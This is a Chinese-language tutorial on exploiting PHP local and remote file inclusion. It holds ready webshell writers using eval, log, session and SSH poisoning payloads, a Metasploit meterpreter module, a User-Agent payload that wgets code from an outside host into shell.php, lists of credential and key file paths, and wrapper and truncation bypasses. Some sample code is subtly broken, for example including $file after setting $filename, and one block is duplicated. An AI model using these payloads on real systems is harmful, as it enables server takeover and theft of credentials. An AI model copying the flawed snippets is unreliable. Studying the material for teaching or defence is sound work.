# 文件包含

## 1、文件包含漏洞概述

服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）

## 2、漏洞产生原因

文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。

示例代码

```php
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

例如：

`$_GET['filename']`参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改`$_GET['filename']`的值，执行非预期的操作。

## 3、文件包含漏洞的危害

* 执行任意代码
* 读取文件源码或敏感信息
* 包含恶意文件控制网站，甚至控制服务器

## 4、文件包含漏洞分类

* 本地文件包含（ Local File Include (LFI)）：包含本地服务器的文件
* 远程文件包含（Remote File Include (RFI)）：可以包含其他服务器的文件可以包含图片等等类型如果图片为PHP脚本语法也会被以PHP形式解析文件包含

远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。

## 5、文件包含的相关函数

### **Php**

| 相关的PHP函数      | 功能解释                                                     | 错误时的操作                                      |
| ------------- | -------------------------------------------------------- | ------------------------------------------- |
| include       | 语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中            | 引入的文件有错误时，只生成警告（E\_WARNING），并且脚本会继续执行脚本     |
| include\_once | 此行为和 include 语句功能类似，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 |                                             |
| require       | 语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 require 语句的文件中            | 引入的文件有错误时，会生成致命错误（E\_COMPILE\_ERROR）并停止脚本运行 |
| require\_once | 与 require 语句功能类似，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。    |                                             |

* include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。
* include\_once()，require\_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。

| PHP函数               | 功能解释                                                                                                     |
| ------------------- | -------------------------------------------------------------------------------------------------------- |
| highlight\_file     | 函数对文件进行语法高亮显示                                                                                            |
| show\_source        | 函数对文件进行语法高亮显示                                                                                            |
| readfile            | <p>函数读取一个文件，并写入到输出缓冲</p><p>如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 '@' 来隐藏错误输出</p> |
| file\_get\_contents | 函数把整个文件读入一个字符串中                                                                                          |
| fopen               | 函数打开文件或者 URL                                                                                             |
| file                | 函数把整个文件读入一个数组中                                                                                           |

### **Jsp/servlet**

* ava.io.file()
* java.io.filereader()

### **Asp**

* include file
* include virtual

## 6、**文件包含漏洞的条件**

在php.ini文件里进行配置

* allow\_url\_ fopen :为ON时 (默认为On)，能读取远程文件,例如file\_get\_contents()就能读远程文件
* allow\_url. include :为ON时 (php5.2之后默认为Off) ，就可使用include和require等方式包含远程文件

## 7、本地文件包含

> 无限制本地文件包含

* 两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）
* 被包含的页面的后缀无论是什么都会当做PHP解析

示例代码

```php
<?php 
$filename = $_GET['file']; 
include($file); 
?>
```

例如：

$\_GET\['filename']参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$\_GET\['filename']的值，执行非预期的操作。

注：即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要文件被包含，其内容会被包含文件包含，并以当前服务器脚本语言执行。

### **测试结果**

![](<../../.gitbook/assets/image (906).png>)

如果包含的文件内容不符合php语言语法的，会直接将文件内容输出，比如：

![](<../../.gitbook/assets/image (940).png>)

### **目录遍历**

```php
<?php 
$filename = $_GET['file']; 
include(/web.$file);   //如果有web目录可以用../上一级目录绕过限制
?>
```

`./` 当前目录 `../` 上一级目录,这样的遍历目录来读取文件

![](<../../.gitbook/assets/image (948).png>)

### **7.1文件包含配置文件**

包含一些敏感的配置文件，获取目标敏感信息

![](<../../.gitbook/assets/image (972).png>)

**常见的敏感信息路径：**

**Windows系统：**

> c:\boot.ini          #查看系统版本\
> c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件\
> c:\windows\repair\sam        #存储 windows 系统初次安装的密码\
> c:\windows\repair\sam // 存储Windows系统初次安装的密码\
> c:\ProgramFiles\mysql\my.ini // MySQL配置\
> c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码\
> c:\windows\php.ini // php 配置信息

**Linux：**

> /etc/passwd // 账户信息\
> /etc/shadow // 账户密码文件\
> /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件\
> /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置\
> /etc/php5/apache2/php.ini //ubuntu 系统的默认路径\
> /usr/local/app/php5/lib/php.ini // PHP相关配置\
> /etc/httpd/conf/httpd.conf // Apache配置文件\
> /etc/my.conf // mysql 配置文件\
> &#x20;/etc/resolv.conf\
> &#x20;/root/.ssh/known\_hosts\
> /etc/network/interfaces\
> /root/ .ssh/authorized\_keys\
> /root/ .ssh/id\_rsa\
> /root/ .ssh/id\_ras.keystore\
> /root/.bash\_history\
> /root/ .mysql\_history\
> /proc/self/fd/fd\[0-9]\*(文件标识符)\
> /proc/mounts\
> /porc/config.gz

......

### **7.2 文件上传图片马联合文件包含**

一般用于文件上传，上传图片马后如果存在文件包含漏洞，那么就可以包含执行图片马里面的`php`代码

还可以上传图片马进行生成一个shell.php进行getshell(条件竞争)

```php
<?php fputs(fopen("shell.php","w"),'<? @eval($_POST[shell]);?>');?>
```

### **7.3 session本地文件包含利用**

* 利用条件：session存储位置获取
* 获取方法1：通过phpinfo信息获取到session.save\_path的session存储位置

常见的php-session存放位置：

* /var/lib/php/sess\_PHPSESSID
* /var/lib/php/sess\_PHPSESSID
* /tmp/sess\_PHPSESSID
* /tmp/sessions/sess\_PHPSESSID

windows默认C:\WINDOWS\Temp或集成环境下的tmp文件夹里

![](<../../.gitbook/assets/image (958).png>)

Linux下默认存放在/var/lib/php/session目录下

![](<../../.gitbook/assets/image (938).png>)

获取方法2：猜测默认的session存放位置

![](<../../.gitbook/assets/image (944).png>)

session中的内容可以被控制，传入恶意代码。

**示例：**

```php
//session.php
<?php
session_start();        //设置session
$ctfs=$_GET['ctfs'];    
$_SESSION["username"]=$ctfs;
?>
```

此php会将获取到的GET型ctfs变量的值存入到session中。

当访问http://127.0.0.1/session.php?ctfs=ctfs 后，会在D:\phpStudy\PHPTutorial\tmp\tmp目录存储session值。

session的文件名为sess\_+sessionid，sessionid可以通过开发者模式获取。

![](<../../.gitbook/assets/image (905).png>)

所以session的文件名为：5ba03eaaa1b81759bbd60937fe821215

到服务器的D:\phpStudy\PHPTutorial\tmp\tmp目录下查看果然存在此文件，内容为：

![](<../../.gitbook/assets/image (932).png>)

**漏洞利用**

通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。

当访问http://127.0.0.1/session.php?ctfs=\<?php phpinfo();?>后，会在D:\phpStudy\PHPTutorial\tmp\tmp目录下存储session的值。

![](<../../.gitbook/assets/image (943).png>)

攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。

![](<../../.gitbook/assets/image (962).png>)

**Getshell思路**

![](<../../.gitbook/assets/image (907).png>)

**扩展**

burp抓包，写入一句话木马，主要在user-agent最后加入

### **7.4 日志本地文件包含利用**

**什么是日志文件？**

WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。

在用户发起请求时，服务器会将请求写入access.log(会记录访问IP、访问链接、Referer和User-Agent等)，当请求错误时将错误写入error.log

注意：

* 一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf ,nginx.conf...)或者根据phpinfo()中的信息来得知
* 日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式。

**日志文件**

配置网站访问Apache访问日志，phpstudy默认是不打开。

**开启通用日志功能**

在D:\phpStudy\PHPTutorial\Apache\conf\httpd.conf的，打开httpd.conf配置文件，第299行

\##CustomLog "logs/access.log" common

去掉前边的 # ，并重启apache。

**日志默认路径**

apache+Linux 日志默认路径

* /etc/httpd/logs/access\_log
* /var/log/httpd/access log

apache+win2003 日志默认路径

* D:/xampp/apache/logs/access.log D:/xampp/apache/logs/error.log

IIS6.0+win2003 默认日志文件

* C:/WINDOWS/system32/Logfiles

IIS7.0+win2003 默认日志文件

* %SystemDrive%/inetpub/logs/LogFiles

nginx 日志文件在用户安装目录的 logs 目录下

如安装目录为 `/usr/local/nginx`,则日志目录就是在

* /usr/local/nginx/logs

也可通过其配置文件 Nginx.conf，获取到日志的存在路径

* /opt/nginx/logs/access.log

**web 中间件默认配置**

apache+linux 默认配置文件

* /etc/httpd/conf/httpd.conf
* index.php?page=/etc/init.d/httpd

IIS6.0+win2003 配置文件

* C:/Windows/system32/inetsrv/metabase.xml

IIS7.0+WIN 配置文件

* C:/Windows/System32/inetsrv/config/application/Host.config

**一.利用条件三个**

* 文件包含漏洞
* 日志文件的路径
* 日志可读性

Windows和linux的路径不一样，但是也有默认的路径

**一.找到日志文件路径**

phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vhosts.conf

![](<../../.gitbook/assets/image (961).png>)

**二.测试是否可以文件包含**

[http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log](http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log)  **** &#x20;

![](<../../.gitbook/assets/image (967).png>)

包含错误日志： ?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志）

**三.包含phpinfo**

我们用浏览器去访问的时候，对于URL路径是直接记录到日志文件里面的

如果是去请求phpinfo代码然后执行那么就把phpinfo代码写进日志文件里面

正常来说是显示phpinfo页面因为在后台把这些特殊字符进行URL编码（浏览器默认将来一些字符进行URL编码）

**解决**

利用Burp进行抓包直接把代码写进去

![](<../../.gitbook/assets/image (971).png>)

再去访问包含日志文件

![](<../../.gitbook/assets/image (926).png>)

**Getshell**

![](<../../.gitbook/assets/image (960).png>)

**总结**

因为浏览器自带URL编码，如果用Burp则绕过

**参考文章**

[https://www.cnblogs.com/my1e3/p/5854897.html](https://www.cnblogs.com/my1e3/p/5854897.html)

可以尝试利用 UA 插入 payload 到日志文件

![](<../../.gitbook/assets/image (909).png>)



### **7.5本地文件包含之MSF攻击模块**

```bash
use exploit/unix/webapp/php_include
set rhost 192.168.159.128
set rport 80
set phpuri /index.php?file=xxLFIxx
set path http://172.18.176.147/
set payload php/meterpreter/bind_tcp
set srvport 8888
exploit -z
```

![](<../../.gitbook/assets/image (966).png>)

参考文章

[https://www.fujieace.com/metasploit/php-meterpreter.html](https://www.fujieace.com/metasploit/php-meterpreter.html)

### **7.6 本地文件包含ftp日志**

`ftp`连接时，用户名输入一句话木马

日志位置在`/var/log/vsftpd.log`

参考文章[https://blog.csdn.net/xysoul/article/details/45031675](https://blog.csdn.net/xysoul/article/details/45031675)

### **7.7 本地文件包含污染的ssh日志shell**

Linux默认日志位置在`/var/log/auth.log`

```bash
ssh -p 22 "<?php phpinfo(); ?>"@目标ip地址
```

案例

```bash
ssh '<?php phpinfo();?>'@192.168.136.143
```

这样把用户名写成phpinfo，ssh的登陆日志就会把此次的登陆行为记录到日志中，利用包含漏洞getshell

![](<../../.gitbook/assets/image (915).png>)

可以看到我们登陆的行为都被记录到了日志当中

![](<../../.gitbook/assets/image (914).png>)

可以看到刚才登陆的时候，成功phpinfo写入到日志文件中并且成功解析

![](<../../.gitbook/assets/image (928).png>)

通过phpinfo查看到了网站根目录

![](<../../.gitbook/assets/image (964).png>)

本来想着利用文件包含漏洞配合fputs和fopen函数在网站根目录写入一句话木马getshell，但是由于单引号太多就报错了，只能另谋出路

![](<../../.gitbook/assets/image (936).png>)

然后就想到了把执行命令的一句话木马写入日志，利用文件包含执行反弹shell

![](<../../.gitbook/assets/image (975).png>)

然后构造请求执行命令，因为刚才我写进去的是通过GET方式用panda参数传参，多个参数之间用&符号连接，还是要注意，命令要url编码再执行

![](<../../.gitbook/assets/image (977).png>)

参考文章

[https://www.cnblogs.com/PANDA-Mosen/p/13262638.html](https://www.cnblogs.com/PANDA-Mosen/p/13262638.html)

### **7.8 phpMyAdmin包含**

&#x20;0x01 phpMyadmin包含session文件

首先进入执行SQL语言地方，执行如下操作

```sql
select '<?php phpinfo();?>'
```

打开`F12`查看到`session`名，完整的`session`文件就是`sess_session`名

![](<../../.gitbook/assets/image (945).png>)

`phpstudy`里面默认`session`存储位置是`phpstudy`下`tmp/tmp`，于是包含该`session`文件

![](<../../.gitbook/assets/image (976).png>)

参考文章

phpMyAdmin CVE-2018-12613\


[https://blog.csdn.net/weixin\_43872099/article/details/104128639](https://blog.csdn.net/weixin\_43872099/article/details/104128639)

\[CVE-2014-8959] phpmyadmin任意文件包含漏洞分析

[https://www.secpulse.com/archives/2595.html](https://www.secpulse.com/archives/2595.html)

### **7.9 包含临时文件+phpinfo getshell**

在PHP文件包含漏洞中，当我们找不到用于触发RCE的有效文件时，如果存在PHPINFO（它可以告诉我们临时文件的随机生成的文件名及其位置），我们可能可以包含一个临时文件来利用它升级为RCE。

**利用方法简述：**

在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php\[6个随机字符]），文件名可以在$\_FILES变量中找到。这个临时文件，在请求结束后就会被删除。

同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$\_FILES变量的内容，自然也包含临时文件名。

在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。

但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。

**这个时候就需要用到条件竞争，具体流程如下：**

1、发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据

2、因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大

3、php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接

4、所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包

5、此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除

6、利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell

**操作过程：**

**访问存在文件包含漏洞的页面**

{% embed url="http://192.168.136.128:8080/lfi.php?file=/etc/passwd" %}

![](<../../.gitbook/assets/image (970).png>)

访问phpinfo页面，确实存在

![](<../../.gitbook/assets/image (903).png>)

然后利用网上的exp进行利用：

python2 exp.py 目标ip 8080 100

![](<../../.gitbook/assets/image (952).png>)

在189次请求时，就写入成功了

脚本exp.py实现了上述过程，成功包含临时文件后，会利用file\_put\_contents函数写入\<?=eval($\_REQUEST\[1])?>一句话后门到/tmp/g文件中，这个文件会永久留在目标机器上

![](<../../.gitbook/assets/image (965).png>)

然后直接利用蚁剑进行连接即可，密码为1：

![](<../../.gitbook/assets/image (912).png>)

### **7.10包含 /proc/self/environ 文件**

Linux下有一个文件/proc/self/environ，这个文件里保存了系统的一些变量。

![](<../../.gitbook/assets/image (951).png>)

利用条件：

1、php 以 cgi 方式运行，这样 environ 才会保持 UA 头。

2、environ 文件存储位置已知，且 environ 文件可读。

姿势：

proc/self/environ 中会保存 user-agent 头。如果在 user-agent 中插入 php 代码，则 php 代码会被写入到 environ 中。之后再包含它，即可。

> ?file=../../../../../../../proc/self/environ

选择 User-Agent 写代码如下：

> \<?system('wget [http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt) -O shell.php');?>

然后提交请求。

**/proc/self/environ文件getshell**

检查proc/self/environ是否可以访问     www.aaa.com/view.php?page=../../../../../proc/self/environ

3、如果可读就注入代码     访问：www.aaa.com/view.php?page=../../../../../proc/self/environ     选择User-Agent 写代码如下：\<?system('wget [http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt) -O shell.php');?>   &#x20;

//提交请求；我们的命令将被执行(将下载[http://www.yourweb.com/oneword.txt](http://www.yourweb.com/oneword.txt)，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.

4、访问shell

参考文章

[https://blog.csdn.net/xysoul/article/details/45031675](https://blog.csdn.net/xysoul/article/details/45031675)

### **7.11 文件包含案例**

![](<../../.gitbook/assets/image (933).png>)

## 8、本地文件包含绕过

### **8.1 %00截断**

PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符串处理函数。在连接字符串时，0 字节 (\x00) 将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串。

**条件**

* PHP版本 < 5.3.4 (不包括5.3) ;
* PHP对所接收的参数，如以上代码的`$_GET['file']`未使用`addslashes`函数。
* PHP的扩展参数：magic\_quotes\_gpc = Off

因为PHP大于等于5.3的版本已经修复了这个问题，满足一定条件下可以使用`%00`，因为当程序流遇到%00终止符的时候将直接终止。如果开启了`gpc`或者使用了`addslashes`函数的话则会对其进行转义。(还可以%00 截断目录遍历)

代码演示

```php
//include.php
<?php
    $file  = $_GET['file'];
    include($file . ".html");
?>
```



```php
//include.php
<?php
    $file  = $_GET['file'];
    include($file . ".html");
?>
```



```php
//include.php
<?php
    $file  = $_GET['file'];
    include($file . ".html");
?>
```

&#x20;\`\` http://127.0.0.1/include.php?file=../phpinfo.php%00&#x20;

![](<../../.gitbook/assets/image (902).png>)

### **8.2 路径长度截断：**

条件：

* windows下目录路径最大长度为256字节，超出部分将丢弃
* &#x20;Linux下目录最大长度为4096字节，超出长度将丢弃

```php
<?php
    $filename  = $_GET['filename'];
    include($filename . ".html");
?>
```

EXP:

```
http://www.test.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
```

**点号截断**

条件：windows OS，点号需要长于256

测试代码：

```php
<?php
    $filename  = $_GET['filename'];
    include($filename . ".html");
?>
```

EXP:

```
http://www.test.com/FI/FI.php
?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
```

### **8.3 ？问号伪截断**

测试代码：

```php
<?php 
$a = $_GET['page'].'.php';
include $a;
 ?>
```

访问：[http://127.0.0.1/include.php?page=http://127.0.0.1/2.jpg?](http://127.0.0.1/include.php?page=http://127.0.0.1/2.jpg?)  如图所示：

![](<../../.gitbook/assets/image (924).png>)

或者

![](<../../.gitbook/assets/image (959).png>)

### **8.4编码绕过**

**url编码**

* ../ -》 %2e%2e%2f -》 ..%2f -》 %2e%2e/
* .. -》 %2e%2e%5c -》 ..%5c -》 %2e%2e

**二次编码**

* ../ -》 %252e%252e%252f
* .. -》 %252e%252e%255c

## 9、远程文件包含

远程文件包含就是允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码。

本地文件包含与远程文件有着相同的原理，但前者只能包含服务器上存在的文件，而后者可以包含远程服务器上的文件。

条件

1. PHP的配置文件allow\_url\_fopen和allow\_url\_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。

* allow\_url\_fopen = On（是否允许打开远程文件）
* allow\_url\_include = On（是否允许include/require远程文件）

1. 所需的远程文件后缀不能与目标服务器的语言相同，如目标服务器解析PHP代码，则远程文件后缀不能为.php。
2. &#x20;远程包含的文件路径必须是绝对路径

> 无限远程文件包含\
>

那么在远程服务器执行phpinfo()之后，你就可以获得目标服务器的内容。由于它不会运行代码，所以包含的信息不是目标服务器，而是远程服务器。（远程的文件名不能为php可解析的扩展名(php、php5...）

**测试代码：**

```php
<?php
    $filename  = $_GET['file'];
    include($file);
?>
```

通过远程文件包含漏洞，包含php.txt可以解析。

如下所示：

![](<../../.gitbook/assets/image (953).png>)

这是我的PHP5.6版本的远程设备信息，目标设备是5.2版本。

接下来是包含文件：

你可以看到，包含文件后，你的远程设备发生了变化，这是为什么呢?

由于目标服务器不包含此代码：

此时，远程服务器会执行此代码的源代码，如下所示：

![](<../../.gitbook/assets/image (908).png>)

所以为了使这个攻击开始运行，你需要做一些修改：

1、修改配置

![](<../../.gitbook/assets/image (904).png>)

2、修改文件后缀

![](<../../.gitbook/assets/image (942).png>)

此时，你可以再来尝试一下包含的攻击向量：

![](<../../.gitbook/assets/image (918).png>)

那么你可以看到所需的信息在此包含之后返回，并且你的目标设备信息不再改变。

接下来，你要再次为远程文件包含做一个shell示例。

![](<../../.gitbook/assets/image (963).png>)

远程文件包含使用的前提是，符合本地文件包含的前提并符合远程文件包含其可用性的前提。



## 10、远程文件包含利用

### **10.1 远程包含Shell**

先写一个test.txt文件，保存在自己的远程服务器yyy上，内容如下:

\<?fputs(fopen( "shell.php" , "w"), "\<?php eval($\_POST\[shell]); ?>")?>

(2)则可以通过访问: http: //Www.xxx.com/index.php?page=http: //www.yyy.com/test.txt

则会在服务器根目录下生产一个shell.php

### **10.2利用XSS包含执行任意代码**

?file=http://127.0.0.1/path/xss.php?xss=phpcode

(需要allow\_url\_fopen=On，allow\_url\_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)

## 11、远程文件包含绕过

**测试代码：**

```php
<?php 
include($_GET['filename'] . ".html"); 
?>
```

代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。

### **11.1“?”号绕过**

```
http://www.127.0.0.1.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?
```

![](<../../.gitbook/assets/image (968).png>)



### **11.2“#”号绕过**

```
http://www.127.0.0.1.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23
```

![](<../../.gitbook/assets/image (913).png>)

### **11.3  还有哪些可以绕？**

用burp跑一遍发现空格也可以绕过：

![](<../../.gitbook/assets/image (929).png>)

%20

![](<../../.gitbook/assets/image (957).png>)

## 12、**文件包含漏洞的利用方式-伪协议**

### 12.1 什么是伪协议：

PHP里面为了读取PHP请求的参数或读取一些数据流/压缩包，通过这样的方式来进行伪协议的处理,

通过PHP伪协议可以通过文件读取/数据流的读取/压缩包的读取，根据这样操作利用到文件包含漏洞里面

Php带有很多内置的url风格的封装协议，这类协议与fopen(),copy(),file\_exists(),filesize()等文件系统函数所提供的功能类似，常见协议如下表：

| 协议        | 功能                      |
| --------- | ----------------------- |
| file://   | 访问本地文件系统                |
| http://   | 访问 HTTP(S) 网址           |
| ftp://    | 访问 FTP(S) URL           |
| php://    | 访问各个输入/输出流（I/O streams） |
| zlib://   | 压缩流                     |
| data://   | 数据（RFC 2397）            |
| glob://   | 查找匹配的文件路径模式             |
| phar://   | PHP 归档                  |
| ssh2://   | Secure Shell 2          |
| rar://    | RAR                     |
| ogg://    | 音频流                     |
| expect:// | 处理交互式的流                 |

_php各种伪协议参考:_[_http://php.net/manual/zh/wrappers.php.php_](http://php.net/manual/zh/wrappers.php.php)

需要看的文章

**1.文件包含漏洞小节**

[https://www.cnblogs.com/iamstudy/articles/include\_file.html](https://www.cnblogs.com/iamstudy/articles/include\_file.html)

**2.论PHP常见的漏洞**

[http://www.anquan.us/static/drops/papers-4544.html](http://www.anquan.us/static/drops/papers-4544.html)

**3.php伪协议**

[http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2\&fps=1](http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2\&fps=1)

**4.包含日志文件getshell**

[https://www.cnblogs.com/my1e3/p/5854897.html](https://www.cnblogs.com/my1e3/p/5854897.html)

**伪协议说明**

| 协议                | 测试PHP版本 | allow\_url\_fpen | allow\_url\_include | 用法                                                                                                                                                                                                                                                                                                                                                           | 说明                                                                              |
| ----------------- | ------- | ---------------- | ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------- |
| file://           | >=5.2   | off/on           | off/on              | ?file=file://D:/soft/phpstudy/WWW/phpcode.txt                                                                                                                                                                                                                                                                                                                | 读取电脑或者服务器的路径某一个文件，而且把内读取出来                                                      |
| php://filter      | >=5.2   | off/on           | off/on              | ?file=php://filter/read=convert.base64-encode/resource=./index.php                                                                                                                                                                                                                                                                                           | 可以通过filter协议读文件，读出来的文件能进行编码                                                     |
| php://input       | >=5.2   | on               | on                  | ?file=php://input POST DATA]\<?php phpinfo0?>                                                                                                                                                                                                                                                                                                                | 可以访问请求原始数据的只读流，将POST的数据当做PHP代码来执行                                               |
| zip://            | >=5.2   | off/on           | off/on              | file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.bxt                                                                                                                                                                                                                                                                                                       | 跟fille差不多，区别在于zip是压缩包 %23是编码是# 就是压缩包里面有一个txt文件                                  |
| compress.bzip2:// | >=5.2   | off/on           | off/on              | ?file=compress.bzip2://D:/soft/phpStudy/WWW/file.gz【or】?file=compress.zlib2://./file.bz2                                                                                                                                                                                                                                                                     |                                                                                 |
| compress.zipb://  | >=5.2   | off/on           | off/on              | <p>?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz</p><p>【or】?file=compress.zlib://./file.gz</p>                                                                                                                                                                                                                                                          |                                                                                 |
| data://           | >=5.2   | on               | on                  | <p>?file=<a href="data://text/plain">data://text/plain</a>,&#x3C;?php phpinfo()?></p><p>【or】</p><p>?file=<a href="data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a>也可以：</p><p>?file=data:text/plain,&#x3C;?php phpinfo()?></p><p>【or】</p><p>?file=data:text/plain:base64.PD9waHAgcGhwaW5mbyqpPz4=</p> | <p>类似input  让用户来控制输入流</p><p>base64编码的phpinfo</p><p>PD9waHAgcGhwaW5mbyqpPz4=</p> |
|                   |         |                  |                     |                                                                                                                                                                                                                                                                                                                                                              |                                                                                 |

| 包装器或协议             | 可控功能                    | allow\_url\_include | 漏洞类型      | 备注                                                                                                                                                           |
| ------------------ | ----------------------- | ------------------- | --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| file://            | -                       | Off                 | LFI /文件处理 |                                                                                                                                                              |
| glob://            | -                       | Off                 | 目录遍历      |                                                                                                                                                              |
| php://filter/read  | include                 | Off                 | 档来披露      | php://filter/read=convert.base64-encode/resource=index.php                                                                                                   |
| php://filter/write | file\_put\_contents     | Off                 | 编码方式      | file\_put\_contents("php://filter/write=string.rot13/resource=x.txt","content");                                                                             |
| php://input        | include                 | On                  | RCE       | Encoding is required while reading .php source: \<?php echo base64\_encode(file\_get\_contents("solution.php"));?> OR just use \<?php system('cat x.php');?> |
| data://            | include                 | On                  | RCE       | data:text/plain,\<?php system("id")?> OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=                                                                 |
| zip://             | include + uploaded file | Off                 | RCE       |                                                                                                                                                              |
| phar://            | include + uploaded file | Off                 | RCE       | PHP version >= 5.3                                                                                                                                           |

来源[https://www.cdxy.me/?p=752](https://www.cdxy.me/?p=752)

### 12.2 file://协议

```kotlin
PHP.ini：
file:// 协议在双off的情况下也可以正常使用；
allow_url_fopen ：off/on
allow_url_include：off/on
```

* file:// 用于访问本地文件
* file:// \[文件的绝对路径和文件名]

**测试代码：**

```php
<?php
@include($_GET["x"]);
?>
```

&#x20;· http://127.0.0.1/1.php?x=file://D://phpinfo.txt   &#x20;

![](<../../.gitbook/assets/image (923).png>)

### 12.3 php://协议 输入/输出流（I/O streams）

**php://filter**_：用于读取源码并进行bash64编码输出；_   &#x20;

在双off的情况下也可以正常使用；

条件：

* allow\_url\_fope   off/on       &#x20;
* allow\_url\_include on

不需要开启allow\_url\_fopen\


